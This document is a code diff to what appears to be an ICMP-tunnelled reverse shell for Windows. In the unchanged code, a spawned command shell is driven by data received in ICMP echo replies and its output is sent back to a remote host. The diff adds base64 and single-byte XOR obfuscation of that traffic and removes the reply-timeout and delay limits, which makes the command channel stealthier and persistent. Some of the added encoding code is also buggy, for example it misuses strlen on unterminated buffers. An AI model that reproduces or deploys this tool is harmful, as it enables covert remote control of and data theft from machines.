@@ -22,7 +22,8 @@
 #include <windows.h>
 #include <winsock2.h>
 #include <iphlpapi.h>
-
+#include <string.h>
+#include <stdint.h>
 #define ICMP_HEADERS_SIZE	(sizeof(ICMP_ECHO_REPLY) + 8)
 
 #define STATUS_OK					0
@@ -40,6 +41,123 @@
 FARPROC icmp_create, icmp_send, to_ip;
 
 int verbose = 0;
+
+static char encoding_table[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
+                                'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
+                                'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
+                                'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
+                                'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
+                                'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
+                                'w', 'x', 'y', 'z', '0', '1', '2', '3',
+                                '4', '5', '6', '7', '8', '9', '+', '/'};
+static char *decoding_table = NULL;
+static int mod_table[] = {0, 2, 1};
+ 
+ 
+char *base64_encode(const unsigned char *data,
+                    size_t input_length,
+                    size_t *output_length) {
+ 
+    *output_length = 4 * ((input_length + 2) / 3);
+ 
+    char *encoded_data = malloc(*output_length);
+    if (encoded_data == NULL) return NULL;
+ 
+    for (int i = 0, j = 0; i < input_length;) {
+ 
+        uint32_t octet_a = i < input_length ? (unsigned char)data[i++] : 0;
+        uint32_t octet_b = i < input_length ? (unsigned char)data[i++] : 0;
+        uint32_t octet_c = i < input_length ? (unsigned char)data[i++] : 0;
+ 
+        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;
+ 
+        encoded_data[j++] = encoding_table[(triple >> 3 * 6) & 0x3F];
+        encoded_data[j++] = encoding_table[(triple >> 2 * 6) & 0x3F];
+        encoded_data[j++] = encoding_table[(triple >> 1 * 6) & 0x3F];
+        encoded_data[j++] = encoding_table[(triple >> 0 * 6) & 0x3F];
+    }
+ 
+    for (int i = 0; i < mod_table[input_length % 3]; i++)
+        encoded_data[*output_length - 1 - i] = '=';
+ 
+    return encoded_data;
+}
+ 
+ 
+unsigned char *base64_decode(const char *data,
+                             size_t input_length,
+                             size_t *output_length) {
+ 
+    if (decoding_table == NULL) build_decoding_table();
+ 
+    if (input_length % 4 != 0) return NULL;
+ 
+    *output_length = input_length / 4 * 3;
+    if (data[input_length - 1] == '=') (*output_length)--;
+    if (data[input_length - 2] == '=') (*output_length)--;
+ 
+    unsigned char *decoded_data = malloc(*output_length);
+    if (decoded_data == NULL) return NULL;
+ 
+    for (int i = 0, j = 0; i < input_length;) {
+ 
+        uint32_t sextet_a = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
+        uint32_t sextet_b = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
+        uint32_t sextet_c = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
+        uint32_t sextet_d = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
+ 
+        uint32_t triple = (sextet_a << 3 * 6)
+        + (sextet_b << 2 * 6)
+        + (sextet_c << 1 * 6)
+        + (sextet_d << 0 * 6);
+ 
+        if (j < *output_length) decoded_data[j++] = (triple >> 2 * 8) & 0xFF;
+        if (j < *output_length) decoded_data[j++] = (triple >> 1 * 8) & 0xFF;
+        if (j < *output_length) decoded_data[j++] = (triple >> 0 * 8) & 0xFF;
+    }
+ 
+    return decoded_data;
+}
+ 
+ 
+void build_decoding_table() {
+ 
+    decoding_table = malloc(256);
+ 
+    for (int i = 0; i < 64; i++)
+        decoding_table[(unsigned char) encoding_table[i]] = i;
+}
+ 
+ 
+void base64_cleanup() {
+    free(decoding_table);
+}
+
+char *xor_encrypt(char *message, char *key) {
+    size_t messagelen = strlen(message);
+    size_t keylen = strlen(key);
+
+    char *encrypted = malloc(messagelen+1);
+
+    int i;
+    for(i = 0; i < messagelen; i++) {
+        encrypted[i] = message[i] ^ key[i % keylen];
+    }
+    encrypted[messagelen] = '\0';
+
+    return encrypted;
+}
+
+char *trim(char *s) {
+    char *ptr;
+    if (!s)
+        return NULL;   // handle NULL string
+    if (!*s)
+        return s;      // handle empty string
+    for (ptr = s + strlen(s) - 1; (ptr >= s) && isspace(*ptr); --ptr);
+    ptr[1] = '\0';
+    return s;
+}
 
 int spawn_shell(PROCESS_INFORMATION *pi, HANDLE *out_read, HANDLE *in_write)
 {
@@ -87,6 +205,7 @@ int spawn_shell(PROCESS_INFORMATION *pi, HANDLE *out_read, HANDLE *in_write)
 
 	return STATUS_OK;
 }
+
 
 void usage(char *path)
 {
@@ -137,6 +256,13 @@ int transfer_icmp(HANDLE icmp_chan, unsigned int target, char *out_buf, unsigned
 		// check received data
 		if (rs > 0) {
 			echo_reply = (PICMP_ECHO_REPLY) temp_in_buf;
+			if (echo_reply->DataSize > 0){
+				//echo_reply->Data = base64_decode(echo_reply->Data,max_in_data_size,&echo_reply->DataSize);
+				echo_reply->Data = xor_encrypt(echo_reply->Data,"K");
+				//echo_reply->Data = trim(echo_reply->Data);
+				echo_reply->DataSize = strlen(echo_reply->Data);
+				//printf("%s\n",echo_reply->Data);
+			}
 			if (echo_reply->DataSize > max_in_data_size) {
 				nbytes = max_in_data_size;
 			} else {
@@ -144,7 +270,6 @@ int transfer_icmp(HANDLE icmp_chan, unsigned int target, char *out_buf, unsigned
 			}
 			memcpy(in_buf, echo_reply->Data, nbytes);
 			*in_buf_size = nbytes;
-
 			free(temp_in_buf);
 			return TRANSFER_SUCCESS;
 		}
@@ -188,6 +313,7 @@ int load_deps()
 
 	return 0;
 }
+
 int main(int argc, char **argv)
 {
 	int opt;
@@ -291,11 +417,12 @@ int main(int argc, char **argv)
 	memset(out_buf, 0x00, max_data_size + ICMP_HEADERS_SIZE);
 
 	// sending/receiving loop
-	blanks = 0;
+	blanks = 0; 
 	do {
 
 		switch(status) {
 			case STATUS_SINGLE:
+
 				// reply with a static string
 				out_buf_size = sprintf(out_buf, "Test1234\n");
 				break;
@@ -310,6 +437,12 @@ int main(int argc, char **argv)
 					if (out_buf_size > 0) {
 						out_buf_size = 0;
 						rs = ReadFile(pipe_read, out_buf, max_data_size, &out_buf_size, NULL);
+						out_buf = base64_encode(out_buf,max_data_size,&out_buf_size);
+						printf("%s\n",out_buf);
+						char *tmp = base64_decode(out_buf,max_data_size,&out_buf_size);
+                                                printf("%s\n",tmp);
+						out_buf_size = strlen(out_buf);
+
 						if (!rs && GetLastError() != ERROR_IO_PENDING) {
 							out_buf_size = sprintf(out_buf, "Error: ReadFile failed with %i\n", GetLastError());
 						} 
@@ -321,21 +454,15 @@ int main(int argc, char **argv)
 		}
 
 		// send request/receive response
-		if (transfer_icmp(icmp_chan, ip_addr, out_buf, out_buf_size, in_buf, &in_buf_size,  max_data_size, timeout) == TRANSFER_SUCCESS) {
+		transfer_icmp(icmp_chan, ip_addr, out_buf, out_buf_size, in_buf, &in_buf_size,  max_data_size, timeout);
 			if (status == STATUS_OK) {
 				// write data from response back into pipe
 				WriteFile(pipe_write, in_buf, in_buf_size, &rs, 0);
 			}
-			blanks = 0;
-		} else {
-			// no reply received or error occured
-			blanks++;
-		}
-
 		// wait between requests
-		Sleep(delay);
+		//Sleep(delay);
 
-	} while (status == STATUS_OK && blanks < max_blanks);
+	} while (status == STATUS_OK );	
 
 	if (status == STATUS_OK) {
 		TerminateProcess(pi.hProcess, 0);
@@ -343,4 +470,5 @@ int main(int argc, char **argv)
 
     return 0;
 }
+
 
